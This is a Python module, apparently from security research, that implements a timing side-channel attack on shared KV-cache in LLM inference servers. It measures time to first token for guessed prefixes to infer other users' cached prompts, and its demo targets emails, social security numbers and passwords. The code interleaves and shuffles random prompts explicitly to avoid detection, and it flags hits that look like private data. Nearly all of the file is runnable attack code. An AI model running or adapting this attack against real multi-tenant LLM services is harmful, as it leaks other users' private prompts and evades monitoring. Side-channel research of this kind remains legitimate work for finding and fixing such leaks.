#!/usr/bin/env python3
"""
SafeKV Time Channel Attack Model

This module implements a time-based side channel attack against SafeKV systems.
The attack exploits the timing differences in TTFT (Time to First Token) to 
infer whether KV-Cache hits occur, potentially revealing private information
from other users' requests.

Attack Principle:
1. When multiple users share KV-Cache, if an attacker's request has the same 
   prefix as another user's previous request, the system may reuse cached KV 
   values, resulting in faster response times.
2. By measuring TTFT differences, the attacker can infer cache hit/miss patterns.
3. This timing side channel can be used to guess private information that 
   follows predictable patterns.

Author: Security Research Team
Date: 2024
"""

import time
import random
import statistics
import json
import asyncio
import aiohttp
from typing import List, Dict, Tuple
from dataclasses import dataclass, field
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class AttackResult:
    """Results from a single attack attempt"""
    candidate: str
    ttft: float
    is_hit: bool
    confidence: float
    timestamp: float

@dataclass
class AttackSession:
    """Represents an attack session with multiple attempts"""
    session_id: str
    target_pattern: str
    candidates: List[str]
    results: List[AttackResult] = field(default_factory=list)
    baseline_ttft: float = 0.0
    hit_threshold: float = 0.0
    
    def add_result(self, result: AttackResult):
        self.results.append(result)
    
    def get_hit_candidates(self) -> List[str]:
        """Get candidates that likely resulted in cache hits"""
        return [r.candidate for r in self.results if r.is_hit]
    
    def get_statistics(self) -> Dict:
        """Get attack statistics"""
        if not self.results:
            return {}
        
        hit_results = [r for r in self.results if r.is_hit]
        miss_results = [r for r in self.results if not r.is_hit]
        
        stats = {
            'total_attempts': len(self.results),
            'hit_count': len(hit_results),
            'miss_count': len(miss_results),
            'hit_rate': len(hit_results) / len(self.results) if self.results else 0,
            'avg_ttft': statistics.mean([r.ttft for r in self.results]),
            'avg_hit_ttft': statistics.mean([r.ttft for r in hit_results]) if hit_results else 0,
            'avg_miss_ttft': statistics.mean([r.ttft for r in miss_results]) if miss_results else 0,
        }
        return stats

class TimeChannelAttacker:
    """
    Time-based side channel attacker for SafeKV systems.
    
    This attacker exploits timing differences in TTFT to infer KV-Cache 
    hit/miss patterns and potentially extract private information.
    """
    
    def __init__(self, 
                 api_url: str,
                 baseline_requests: int = 10,
                 confidence_threshold: float = 0.8,
                 request_delay: float = 0.1):
        """
        Initialize the attacker.
        
        Args:
            api_url: URL of the target LLM API
            baseline_requests: Number of requests to establish baseline TTFT
            confidence_threshold: Threshold for determining cache hits
            request_delay: Delay between requests to avoid rate limiting
        """
        self.api_url = api_url
        self.baseline_requests = baseline_requests
        self.confidence_threshold = confidence_threshold
        self.request_delay = request_delay
        
        # Attack state
        self.baseline_ttft = 0.0
        self.hit_threshold = 0.0
        self.sessions: Dict[str, AttackSession] = {}
        
        # Statistics
        self.total_requests = 0
        self.successful_attacks = 0
        
    async def establish_baseline(self, random_prompts: List[str]) -> float:
        """
        Establish baseline TTFT by sending random requests.
        
        Args:
            random_prompts: List of random prompts to use for baseline
            
        Returns:
            Average TTFT for cache misses
        """
        logger.info("Establishing baseline TTFT...")
        
        ttfts = []
        for i, prompt in enumerate(random_prompts[:self.baseline_requests]):
            try:
                ttft = await self._send_request(prompt)
                ttfts.append(ttft)
                logger.info(f"Baseline request {i+1}/{self.baseline_requests}: TTFT={ttft:.3f}s")
                
                if i < len(random_prompts) - 1:
                    await asyncio.sleep(self.request_delay)
                    
            except Exception as e:
                logger.warning(f"Baseline request {i+1} failed: {e}")
                continue
        
        if not ttfts:
            raise ValueError("Failed to establish baseline - no successful requests")
        
        self.baseline_ttft = statistics.mean(ttfts)
        self.hit_threshold = self.baseline_ttft * 0.8  # Assume 20% speedup for cache hits
        
        logger.info(f"Baseline established: avg_ttft={self.baseline_ttft:.3f}s, hit_threshold={self.hit_threshold:.3f}s")
        return self.baseline_ttft
    
    async def _send_request(self, prompt: str) -> float:
        """
        Send a request to the LLM API and measure TTFT.
        
        Args:
            prompt: The prompt to send
            
        Returns:
            TTFT in seconds
        """
        payload = {
            "text": prompt,
            "max_new_tokens": 10,  # Minimal tokens to measure TTFT
            "temperature": 0.0,    # Deterministic output
            "stream": True
        }
        
        start_time = time.perf_counter()
        ttft = 0.0
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.api_url, json=payload) as response:
                    if response.status == 200:
                        async for chunk_bytes in response.content:
                            chunk_bytes = chunk_bytes.strip()
                            if not chunk_bytes:
                                continue
                            
                            chunk = chunk_bytes.decode("utf-8")
                            if chunk.startswith("data: "):
                                chunk = chunk[6:]  # Remove "data: " prefix
                            
                            if chunk == "[DONE]":
                                break
                            
                            try:
                                data = json.loads(chunk)
                                if data.get("text"):
                                    # First token received
                                    if ttft == 0.0:
                                        ttft = time.perf_counter() - start_time
                                    break
                            except json.JSONDecodeError:
                                continue
                    else:
                        raise Exception(f"HTTP {response.status}: {response.reason}")
        
        except Exception as e:
            logger.error(f"Request failed: {e}")
            raise
        
        if ttft == 0.0:
            raise Exception("No tokens received")
        
        return ttft
    
    def _determine_cache_hit(self, ttft: float) -> Tuple[bool, float]:
        """
        Determine if a request resulted in a cache hit based on TTFT.
        
        Args:
            ttft: Time to first token
            
        Returns:
            Tuple of (is_hit, confidence)
        """
        if ttft <= self.hit_threshold:
            # Likely cache hit
            confidence = min(1.0, (self.baseline_ttft - ttft) / (self.baseline_ttft - self.hit_threshold))
            return True, confidence
        else:
            # Likely cache miss
            confidence = min(1.0, (ttft - self.hit_threshold) / (self.baseline_ttft - self.hit_threshold))
            return False, confidence
    
    async def attack_candidate_set(self, 
                                 session_id: str,
                                 target_pattern: str,
                                 candidates: List[str],
                                 random_prompts: List[str]) -> AttackSession:
        """
        Attack a set of candidates to determine which ones result in cache hits.
        
        Args:
            session_id: Unique identifier for this attack session
            target_pattern: The pattern being attacked (for logging)
            candidates: List of candidate strings to test
            random_prompts: Random prompts to interleave with candidates
            
        Returns:
            AttackSession with results
        """
        logger.info(f"Starting attack session {session_id} on pattern: {target_pattern}")
        logger.info(f"Testing {len(candidates)} candidates")
        
        session = AttackSession(
            session_id=session_id,
            target_pattern=target_pattern,
            candidates=candidates,
            baseline_ttft=self.baseline_ttft,
            hit_threshold=self.hit_threshold
        )
        
        # Interleave candidates with random prompts to avoid detection
        all_requests = []
        candidate_indices = []
        
        for i, candidate in enumerate(candidates):
            all_requests.append((candidate, True, i))  # (prompt, is_candidate, candidate_index)
            if i < len(random_prompts):
                all_requests.append((random_prompts[i], False, -1))
        
        # Shuffle to randomize order
        random.shuffle(all_requests)
        
        for i, (prompt, is_candidate, candidate_index) in enumerate(all_requests):
            try:
                ttft = await self._send_request(prompt)
                is_hit, confidence = self._determine_cache_hit(ttft)
                
                if is_candidate:
                    result = AttackResult(
                        candidate=prompt,
                        ttft=ttft,
                        is_hit=is_hit,
                        confidence=confidence,
                        timestamp=time.time()
                    )
                    session.add_result(result)
                    
                    logger.info(f"Candidate {candidate_index+1}/{len(candidates)}: "
                              f"'{prompt[:50]}...' -> TTFT={ttft:.3f}s, "
                              f"Hit={is_hit}, Confidence={confidence:.2f}")
                else:
                    logger.debug(f"Random prompt: TTFT={ttft:.3f}s")
                
                self.total_requests += 1
                
                # Add delay between requests
                if i < len(all_requests) - 1:
                    await asyncio.sleep(self.request_delay)
                    
            except Exception as e:
                logger.warning(f"Request {i+1} failed: {e}")
                continue
        
        self.sessions[session_id] = session
        
        # Analyze results
        hit_candidates = session.get_hit_candidates()
        stats = session.get_statistics()
        
        logger.info(f"Attack session {session_id} completed:")
        logger.info(f"  Hit rate: {stats['hit_rate']:.2f}")
        logger.info(f"  Hit candidates: {len(hit_candidates)}")
        if hit_candidates:
            logger.info(f"  Likely matches: {hit_candidates[:3]}...")
        
        return session
    
    def generate_random_prompts(self, count: int, length_range: Tuple[int, int] = (20, 100)) -> List[str]:
        """
        Generate random prompts for baseline and interleaving.
        
        Args:
            count: Number of prompts to generate
            length_range: Range of prompt lengths
            
        Returns:
            List of random prompts
        """
        prompts = []
        words = [
            "the", "a", "an", "and", "or", "but", "in", "on", "at", "to", "for", "of", "with", "by",
            "is", "are", "was", "were", "be", "been", "being", "have", "has", "had", "do", "does", "did",
            "will", "would", "could", "should", "may", "might", "can", "must", "shall",
            "computer", "science", "technology", "data", "information", "system", "program", "code",
            "algorithm", "function", "variable", "class", "object", "method", "process", "analysis"
        ]
        
        for _ in range(count):
            length = random.randint(*length_range)
            prompt = " ".join(random.choices(words, k=length))
            prompts.append(prompt)
        
        return prompts
    
    def analyze_attack_results(self, session_id: str) -> Dict:
        """
        Analyze the results of an attack session.
        
        Args:
            session_id: Session to analyze
            
        Returns:
            Analysis results
        """
        if session_id not in self.sessions:
            raise ValueError(f"Session {session_id} not found")
        
        session = self.sessions[session_id]
        stats = session.get_statistics()
        hit_candidates = session.get_hit_candidates()
        
        analysis = {
            'session_id': session_id,
            'target_pattern': session.target_pattern,
            'statistics': stats,
            'hit_candidates': hit_candidates,
            'likely_private_info': [],
            'attack_success': len(hit_candidates) > 0
        }
        
        # Analyze hit candidates for potential private information
        for candidate in hit_candidates:
            # Simple heuristics for identifying private information
            if any(pattern in candidate.lower() for pattern in [
                '@', '.com', '.org', '.edu',  # Email patterns
                'password', 'secret', 'private', 'confidential',
                'ssn', 'social', 'security', 'number',
                'credit', 'card', 'account', 'bank',
                'phone', 'mobile', 'address', 'zip'
            ]):
                analysis['likely_private_info'].append(candidate)
        
        return analysis
    
    def get_attack_summary(self) -> Dict:
        """
        Get summary of all attack sessions.
        
        Returns:
            Summary statistics
        """
        total_sessions = len(self.sessions)
        successful_sessions = sum(1 for s in self.sessions.values() 
                                if len(s.get_hit_candidates()) > 0)
        
        all_hit_candidates = []
        for session in self.sessions.values():
            all_hit_candidates.extend(session.get_hit_candidates())
        
        summary = {
            'total_sessions': total_sessions,
            'successful_sessions': successful_sessions,
            'success_rate': successful_sessions / total_sessions if total_sessions > 0 else 0,
            'total_requests': self.total_requests,
            'total_hit_candidates': len(all_hit_candidates),
            'unique_hit_candidates': len(set(all_hit_candidates)),
            'baseline_ttft': self.baseline_ttft,
            'hit_threshold': self.hit_threshold
        }
        
        return summary

# Example usage and demonstration
async def demonstrate_attack():
    """
    Demonstrate the time channel attack against a SafeKV system.
    """
    # Configuration
    API_URL = "http://localhost:30000/generate"  # Adjust to your target
    
    # Initialize attacker
    attacker = TimeChannelAttacker(API_URL)
    
    # Generate random prompts for baseline
    random_prompts = attacker.generate_random_prompts(20)
    
    # Establish baseline
    await attacker.establish_baseline(random_prompts)
    
    # Example candidate sets for different attack scenarios
    attack_scenarios = [
        {
            'session_id': 'email_attack',
            'target_pattern': 'email_addresses',
            'candidates': [
                'user@example.com',
                'admin@company.org',
                'test@domain.edu',
                'john.doe@corp.com',
                'jane.smith@university.edu'
            ]
        },
        {
            'session_id': 'ssn_attack', 
            'target_pattern': 'social_security_numbers',
            'candidates': [
                '123-45-6789',
                '987-65-4321',
                '111-22-3333',
                '444-55-6666',
                '777-88-9999'
            ]
        },
        {
            'session_id': 'password_attack',
            'target_pattern': 'passwords',
            'candidates': [
                'password123',
                'admin123',
                'secret2024',
                'securepass',
                'mypassword'
            ]
        }
    ]
    
    # Execute attacks
    for scenario in attack_scenarios:
        try:
            # Generate additional random prompts for interleaving
            interleaving_prompts = attacker.generate_random_prompts(10)
            
            # Execute attack
            session = await attacker.attack_candidate_set(
                session_id=scenario['session_id'],
                target_pattern=scenario['target_pattern'],
                candidates=scenario['candidates'],
                random_prompts=interleaving_prompts
            )
            
            # Analyze results
            analysis = attacker.analyze_attack_results(scenario['session_id'])
            print(f"\nAttack Analysis for {scenario['session_id']}:")
            print(json.dumps(analysis, indent=2))
            
        except Exception as e:
            logger.error(f"Attack {scenario['session_id']} failed: {e}")
    
    # Print overall summary
    summary = attacker.get_attack_summary()
    print(f"\nOverall Attack Summary:")
    print(json.dumps(summary, indent=2))

if __name__ == "__main__":
    # Run demonstration
    asyncio.run(demonstrate_attack()) 